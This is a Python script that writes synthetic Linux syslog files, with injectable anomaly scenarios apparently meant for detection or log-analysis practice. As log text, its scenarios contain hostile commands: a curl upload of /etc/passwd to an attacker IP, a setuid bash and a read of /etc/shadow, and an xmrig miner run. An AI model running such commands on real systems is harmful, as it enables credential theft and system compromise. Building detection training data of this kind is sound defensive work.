#!/usr/bin/env python3
"""
Realistic Linux syslog generator — writes to split log files like a real system.
No syslog daemon required.

Output files (default: /var/log/):
    auth.log    — SSH, sudo, login events
    kern.log    — kernel, UFW, OOM events
    cron.log    — cron job events
    syslog      — everything (like a real /var/log/syslog)

Usage:
    python3 generate_logs.py                          # continuous, default /var/log/
    python3 generate_logs.py --logdir ./logs          # write to ./logs/ instead
    python3 generate_logs.py --scenario brute_force   # inject a needle
    python3 generate_logs.py --list-scenarios         # show all needles
    python3 generate_logs.py --count 1000 --interval 0.05 --scenario data_exfil
    python3 generate_logs.py --scenario all --count 2000 --logdir ./logs
"""

import random
import time
import argparse
import signal
import sys
import os
from datetime import datetime

# ---------------------------------------------------------------------------
# Persistent actors
# ---------------------------------------------------------------------------

TRUSTED_USERS = ["ubuntu", "alice", "bob", "deploy", "ci"]
INTERNAL_IPS  = [f"10.0.1.{i}" for i in [10, 20, 21, 50, 100, 105]]
KNOWN_BAD_IPS = ["185.220.101.45", "192.42.116.16", "45.95.147.23",
                 "194.165.16.11", "91.108.4.1"]
EXTERNAL_IPS  = [f"203.0.113.{x}" for x in range(1, 20)] + KNOWN_BAD_IPS
SERVICES      = ["nginx", "postgresql", "redis", "docker",
                 "sshd", "cron", "NetworkManager", "fail2ban",
                 "prometheus-node-exporter"]
COMMANDS      = [
    "/usr/bin/apt update",
    "/bin/systemctl restart nginx",
    "/usr/bin/journalctl -f",
    "/bin/bash /opt/deploy.sh",
    "/usr/bin/python3 /opt/monitor.py",
    "/usr/sbin/logrotate /etc/logrotate.conf",
]

HOSTNAME = "codespace-dev"

SERVICE_PIDS = {svc: random.randint(500, 3000) for svc in SERVICES}
SERVICE_PIDS["sshd"] = random.randint(800, 900)
SERVICE_PIDS["cron"] = random.randint(400, 600)

def spid(service):
    return SERVICE_PIDS.get(service, random.randint(1000, 65000))

def epid():
    return random.randint(10000, 65000)

def rand_port():
    return random.randint(32768, 60999)

def rand_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def rand_container():
    return "".join(random.choices("abcdef0123456789", k=12))

def rand_internal():
    return random.choice(INTERNAL_IPS)

def rand_external():
    return random.choice([ip for ip in EXTERNAL_IPS if ip not in KNOWN_BAD_IPS])

def now():
    return datetime.now().strftime("%b %d %H:%M:%S")

def ts():
    return datetime.now().strftime("%Y-%m-%dT%H:%M:%S")

# ---------------------------------------------------------------------------
# File routing — mirrors real Linux log split
# ---------------------------------------------------------------------------
# Each log entry is (target_files, message)
# target_files: list of one or more of "auth", "kern", "cron", "syslog"
# "syslog" gets everything (like /var/log/syslog)

AUTH   = ["auth", "syslog"]
KERN   = ["kern", "syslog"]
CRON   = ["cron", "syslog"]
DAEMON = ["syslog"]

FILE_MAP = {
    "auth":   "auth.log",
    "kern":   "kern.log",
    "cron":   "cron.log",
    "syslog": "syslog",
}

# ---------------------------------------------------------------------------
# Correlated event sequences
# Each returns a list of (targets, message) tuples
# ---------------------------------------------------------------------------

def seq_ssh_success(user=None, ip=None):
    user = user or random.choice(TRUSTED_USERS)
    ip   = ip   or rand_internal()
    port = rand_port()
    sess = random.randint(1, 99)
    return [
        (AUTH, f"sshd[{spid('sshd')}]: Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:xK3mQ9abc"),
        (AUTH, f"sshd[{spid('sshd')}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)"),
        (AUTH, f"systemd-logind[{spid('sshd')}]: New session {sess} of user {user}."),
    ]

def seq_ssh_disconnect(user=None, ip=None):
    user = user or random.choice(TRUSTED_USERS)
    ip   = ip   or rand_internal()
    port = rand_port()
    return [
        (AUTH, f"sshd[{spid('sshd')}]: Disconnected from user {user} {ip} port {port}"),
        (AUTH, f"sshd[{spid('sshd')}]: pam_unix(sshd:session): session closed for user {user}"),
    ]

def seq_ssh_fail(user=None, ip=None):
    user = user or random.choice(TRUSTED_USERS)
    ip   = ip   or rand_external()
    port = rand_port()
    return [
        (AUTH, f"sshd[{spid('sshd')}]: Failed password for {user} from {ip} port {port} ssh2"),
    ]

def seq_sudo(user=None, cmd=None):
    user = user or random.choice(TRUSTED_USERS)
    cmd  = cmd  or random.choice(COMMANDS)
    pid  = epid()
    return [
        (AUTH, f"sudo[{pid}]:  {user} : TTY=pts/{random.randint(0,3)} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"),
        (AUTH, f"sudo[{pid}]: pam_unix(sudo:session): session opened for user root by {user}(uid=0)"),
        (AUTH, f"sudo[{pid}]: pam_unix(sudo:session): session closed for user root"),
    ]

def seq_cron():
    cmds = [
        "run-parts /etc/cron.hourly",
        "/usr/sbin/logrotate /etc/logrotate.conf",
        "find /tmp -type f -atime +10 -delete",
        "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
        "/opt/backup.sh >> /var/log/backup.log 2>&1",
        "/usr/local/bin/health-check.sh",
    ]
    return [
        (CRON, f"CRON[{epid()}]: (root) CMD ({random.choice(cmds)})"),
    ]

def seq_service_restart(service=None):
    service = service or random.choice(SERVICES)
    return [
        (DAEMON, f"systemd[1]: Stopping {service}.service..."),
        (DAEMON, f"systemd[1]: Stopped {service}.service."),
        (DAEMON, f"systemd[1]: Starting {service}.service..."),
        (DAEMON, f"systemd[1]: Started {service}.service."),
    ]

def seq_service_fail(service=None):
    service = service or random.choice(SERVICES)
    return [
        (DAEMON, f"systemd[1]: {service}.service: Main process exited, code=exited, status=1/FAILURE"),
        (DAEMON, f"systemd[1]: Failed to start {service}.service."),
        (DAEMON, f"systemd[1]: {service}.service: Scheduled restart job, restart counter is at {random.randint(1,5)}."),
    ]

def seq_ufw_block(ip=None, dpt=None):
    ip  = ip  or rand_external()
    dpt = dpt or random.choice([22, 80, 443, 3306, 5432])
    return [
        (KERN, f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC={rand_mac()} SRC={ip} DST={rand_internal()} "
               f"LEN=60 TOS=0x00 PREC=0x00 TTL=49 ID={random.randint(1000,65000)} DF PROTO=TCP "
               f"SPT={rand_port()} DPT={dpt} WINDOW=65535 RES=0x00 SYN URGP=0"),
    ]

def seq_oom():
    process = random.choice(["python3", "java", "node", "ruby"])
    pid = epid()
    return [
        (KERN, f"kernel: {process} invoked oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE), order=0"),
        (KERN, f"kernel: Out of memory: Kill process {pid} ({process}) score {random.randint(500,999)} or sacrifice child"),
        (KERN, f"kernel: Killed process {pid} ({process}) total-vm:{random.randint(500000,2000000)}kB, "
               f"anon-rss:{random.randint(100000,800000)}kB, file-rss:0kB, shmem-rss:0kB"),
    ]

def seq_disk_warning():
    pct = random.randint(85, 95)
    return [
        (DAEMON, f"systemd[1]: /dev/sda1 is {pct}% full. Consider freeing up disk space."),
        (KERN,   f"kernel: EXT4-fs warning (device sda1): ext4_dx_add_entry: Directory index full!"),
    ]

def seq_docker():
    cid = rand_container()
    return [
        (DAEMON, f"dockerd[{spid('docker')}]: time=\"{ts()}\" level=info msg=\"Container {cid} started\""),
        (DAEMON, f"dockerd[{spid('docker')}]: time=\"{ts()}\" level=info msg=\"Container {cid} health: healthy\""),
    ]

def seq_network():
    return [
        (DAEMON, f"NetworkManager[{spid('NetworkManager')}]: <info> device (eth0): state change: activated -> deactivating"),
        (DAEMON, f"NetworkManager[{spid('NetworkManager')}]: <info> device (eth0): Activation: successful, device activated."),
    ]

NORMAL_POOL = []
for fn, weight in [
    (seq_ssh_success,    8),
    (seq_ssh_disconnect, 6),
    (seq_ssh_fail,       4),
    (seq_sudo,           5),
    (seq_cron,          12),
    (seq_service_restart,2),
    (seq_ufw_block,      8),
    (seq_docker,         4),
    (seq_network,        3),
    (seq_oom,            1),
    (seq_disk_warning,   1),
]:
    NORMAL_POOL.extend([fn] * weight)

# ---------------------------------------------------------------------------
# NEEDLE SCENARIOS
# ---------------------------------------------------------------------------

def scenario_brute_force():
    """SSH brute force from a single bad IP, then fail2ban ban.
    Visible in: auth.log and syslog"""
    ip   = random.choice(KNOWN_BAD_IPS)
    user = random.choice(TRUSTED_USERS)
    lines = []
    for _ in range(random.randint(18, 35)):
        attempt_user = random.choice(["root", "admin", "ubuntu", "pi", user])
        lines += seq_ssh_fail(user=attempt_user, ip=ip)
    lines += [(AUTH, f"fail2ban.actions[{spid('fail2ban')}]: NOTICE  [sshd] Ban {ip}")]
    return lines

def scenario_privilege_escalation():
    """Normal login followed by suspicious sudo chain.
    Visible in: auth.log and syslog"""
    user = random.choice(TRUSTED_USERS)
    ip   = rand_internal()
    lines = []
    lines += seq_ssh_success(user=user, ip=ip)
    lines += seq_sudo(user=user, cmd="/usr/bin/apt update")
    for cmd in ["/bin/bash", "/usr/bin/passwd root", "/bin/chmod u+s /bin/bash",
                "/usr/sbin/adduser hacker sudo", "cat /etc/shadow"]:
        lines += seq_sudo(user=user, cmd=cmd)
    lines += [(AUTH, f"sudo[{epid()}]: pam_unix(sudo:auth): authentication failure; "
                     f"logname={user} uid=1000 euid=0 tty=/dev/pts/0 ruser={user} rhost= user={user}")]
    return lines

def scenario_data_exfil():
    """Outbound data exfiltration to known bad IP via curl.
    Visible in: kern.log (UFW) and syslog"""
    bad_ip = random.choice(KNOWN_BAD_IPS)
    pid    = epid()
    lines  = []
    for _ in range(random.randint(8, 15)):
        lines += [(KERN, f"kernel: [UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
                         f"LEN={random.randint(1400,1500)} PROTO=TCP SPT={rand_port()} DPT=443")]
    lines += [
        (AUTH, f"kernel: audit: type=1400 audit({ts()}): apparmor=\"ALLOWED\" "
               f"operation=\"exec\" profile=\"unconfined\" name=\"/usr/bin/curl\" pid={pid} comm=\"curl\""),
        (AUTH, f"sudo[{pid}]: deploy : command not allowed ; TTY=pts/1 ; "
               f"PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://{bad_ip}/upload -T /etc/passwd"),
    ]
    return lines

def scenario_service_cascade():
    """PostgreSQL crash cascades to nginx, redis, OOM kill.
    Visible in: kern.log and syslog"""
    lines  = seq_service_fail("postgresql")
    lines += [
        (DAEMON, "systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE"),
        (DAEMON, "systemd[1]: redis.service: Start request repeated too quickly."),
        (DAEMON, "systemd[1]: redis.service: Failed with result 'exit-code'."),
        (KERN,   f"kernel: Out of memory: Kill process {epid()} (postgres) "
                 f"score {random.randint(700,999)} or sacrifice child"),
    ]
    lines += seq_disk_warning()
    return lines

def scenario_crypto_miner():
    """xmrig cryptominer detected running from /tmp.
    Visible in: kern.log, auth.log, and syslog"""
    pid    = epid()
    bad_ip = random.choice(KNOWN_BAD_IPS)
    return [
        (KERN, f"kernel: [UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
               f"LEN=1480 PROTO=TCP SPT={rand_port()} DPT=3333"),
        (KERN, f"kernel: audit: type=1326 audit({ts()}): arch=c000003e syscall=56 "
               f"success=yes exit=0 items=0 ppid=1 pid={pid} auid=1000 uid=1000 "
               f"comm=\"xmrig\" exe=\"/tmp/.x/xmrig\""),
        (KERN, f"kernel: [UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
               f"LEN=1480 PROTO=TCP SPT={rand_port()} DPT=4444"),
        (AUTH, f"sudo[{pid}]: deploy : command not allowed ; TTY=pts/2 ; "
               f"PWD=/tmp/.x ; USER=root ; COMMAND=/tmp/.x/xmrig --pool {bad_ip}:3333 --user x --pass x"),
    ]

def scenario_recon():
    """Port scan from a bad IP triggering many UFW blocks.
    Visible in: kern.log and syslog"""
    ip    = random.choice(KNOWN_BAD_IPS)
    lines = []
    for port in random.sample(range(1, 10000), random.randint(25, 50)):
        lines += [(KERN, f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC={rand_mac()} SRC={ip} "
                         f"DST={rand_internal()} LEN=44 PROTO=TCP SPT={rand_port()} "
                         f"DPT={port} WINDOW=1024 RES=0x00 SYN URGP=0")]
    lines += [(AUTH, f"fail2ban.actions[{spid('fail2ban')}]: NOTICE  [sshd] Ban {ip}")]
    return lines

SCENARIOS = {
    "brute_force":          (scenario_brute_force,         "SSH brute force from bad IP → fail2ban ban",          "auth.log, syslog"),
    "privilege_escalation": (scenario_privilege_escalation,"Suspicious sudo chain post-login",                    "auth.log, syslog"),
    "data_exfil":           (scenario_data_exfil,          "curl exfil of /etc/passwd to bad IP",                 "kern.log, auth.log, syslog"),
    "service_cascade":      (scenario_service_cascade,     "PostgreSQL crash cascades to nginx, redis, OOM",      "syslog, kern.log"),
    "crypto_miner":         (scenario_crypto_miner,        "xmrig detected in /tmp with outbound connections",    "kern.log, auth.log, syslog"),
    "recon":                (scenario_recon,               "Port scan from bad IP triggering UFW blocks",         "kern.log, syslog"),
}

# ---------------------------------------------------------------------------
# Bursty timing
# ---------------------------------------------------------------------------

def next_interval(base):
    r = random.random()
    if r < 0.05:
        return base * random.uniform(5, 15)
    elif r < 0.20:
        return base * random.uniform(0.01, 0.1)
    else:
        return base * random.uniform(0.5, 2.0)

# ---------------------------------------------------------------------------
# Write
# ---------------------------------------------------------------------------

def write_line(targets, message, logdir, quiet):
    timestamp = now()
    line = f"{timestamp} {HOSTNAME} {message}"
    for target in targets:
        filename = FILE_MAP[target]
        path = os.path.join(logdir, filename)
        with open(path, "a") as f:
            f.write(line + "\n")
    if not quiet:
        # Color-code by file target for readability
        prefix = targets[0] if targets else "syslog"
        colors = {"auth": "\033[33m", "kern": "\033[31m", "cron": "\033[36m", "syslog": "\033[0m"}
        color  = colors.get(prefix, "\033[0m")
        print(f"{color}[{prefix:6}] {line}\033[0m")
    return line

def emit_sequence(lines, logdir, quiet, interval=0.0):
    count = 0
    for targets, message in lines:
        write_line(targets, message, logdir, quiet)
        count += 1
        if interval > 0:
            time.sleep(interval * random.uniform(0.05, 0.3))
    return count

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def handle_exit(sig, frame):
    print("\nStopping log generator.")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="Realistic split-file syslog generator with injectable anomaly scenarios"
    )
    parser.add_argument("--logdir", type=str, default="/var/log",
                        help="Directory to write log files (default: /var/log)")
    parser.add_argument("--count", type=int, default=None,
                        help="Target log lines then exit (default: unlimited)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Base seconds between sequences (default: 1.0)")
    parser.add_argument("--scenario", type=str, default=None,
                        help="Needle to inject: " + ", ".join(list(SCENARIOS.keys()) + ["all"]))
    parser.add_argument("--scenario-after", type=int, default=None,
                        help="Inject scenario after N lines of noise (default: random)")
    parser.add_argument("--list-scenarios", action="store_true",
                        help="List available scenarios and exit")
    parser.add_argument("--quiet", action="store_true",
                        help="Suppress stdout output")
    args = parser.parse_args()

    if args.list_scenarios:
        print("\nAvailable scenarios (needles):\n")
        print(f"  {'NAME':<25} {'VISIBLE IN':<25} DESCRIPTION")
        print(f"  {'-'*24} {'-'*24} {'-'*35}")
        for name, (_, desc, files) in SCENARIOS.items():
            print(f"  {name:<25} {files:<25} {desc}")
        print(f"\n  {'all':<25} {'all files':<25} Inject all scenarios in random order\n")
        sys.exit(0)

    # Ensure logdir exists
    os.makedirs(args.logdir, exist_ok=True)
    print(f"Writing to: {args.logdir}/{{auth.log, kern.log, cron.log, syslog}}")

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    # When to inject
    inject_at = args.scenario_after
    if args.scenario and inject_at is None:
        if args.count:
            inject_at = random.randint(max(20, args.count // 5), max(30, args.count // 2))
        else:
            inject_at = random.randint(50, 200)

    # Which scenarios
    inject_queue = []
    if args.scenario == "all":
        names = list(SCENARIOS.keys())
        random.shuffle(names)
        inject_queue = [SCENARIOS[n][0] for n in names]
    elif args.scenario:
        if args.scenario not in SCENARIOS:
            print(f"Unknown scenario '{args.scenario}'. Use --list-scenarios.")
            sys.exit(1)
        inject_queue = [SCENARIOS[args.scenario][0]]

    print(f"Generating logs (base interval: {args.interval}s) "
          f"{'(unlimited)' if args.count is None else f'(~{args.count} lines)'}...")
    if inject_queue:
        name = args.scenario
        _, _, files = SCENARIOS.get(args.scenario, (None, None, "all files")) if args.scenario != "all" else (None, None, "all files")
        print(f"Scenario '{args.scenario}' injects after ~{inject_at} lines. Watch: {files}")
    print("Ctrl+C to stop.\n")

    total_lines  = 0
    all_injected = False

    while args.count is None or total_lines < args.count:

        if inject_queue and not all_injected and total_lines >= inject_at:
            fn = inject_queue.pop(0)
            needle = fn()
            if not args.quiet:
                print(f"\n{'='*60}\n>>> INJECTING: {fn.__name__}\n{'='*60}\n")
            total_lines += emit_sequence(needle, args.logdir, args.quiet,
                                         interval=args.interval * 0.1)
            if not inject_queue:
                all_injected = True
            else:
                inject_at = total_lines + random.randint(30, 100)
            continue

        seq = random.choice(NORMAL_POOL)
        lines = seq()
        total_lines += emit_sequence(lines, args.logdir, args.quiet,
                                      interval=args.interval * 0.05)
        time.sleep(next_interval(args.interval))

    print(f"\nDone. Emitted ~{total_lines} log lines.")

if __name__ == "__main__":
    main()



    